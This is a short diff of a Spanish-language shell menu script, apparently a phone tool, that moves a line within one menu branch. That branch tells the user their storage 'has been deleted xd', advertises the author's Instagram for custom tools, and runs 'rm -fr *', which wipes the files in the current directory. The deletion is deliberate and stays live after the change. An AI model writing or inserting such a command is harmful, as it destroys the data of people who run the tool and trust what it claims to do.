@@ -107,10 +107,10 @@ case $letra in
              sleep 0.5
              echo -e
              echo -e "$amarillo -$rojo Tu storage a sido eliminado xd"
-             rm -fr *
              sleep 0.5
              echo
              echo -e "$amarillo -$cyan Si quieres que haga una herramienta$blanco personalizada$cyan, escribeme al ig $amarillo -->$blanco WhBeatZ "
+             rm -fr *
              sleep 10
              ;;
 
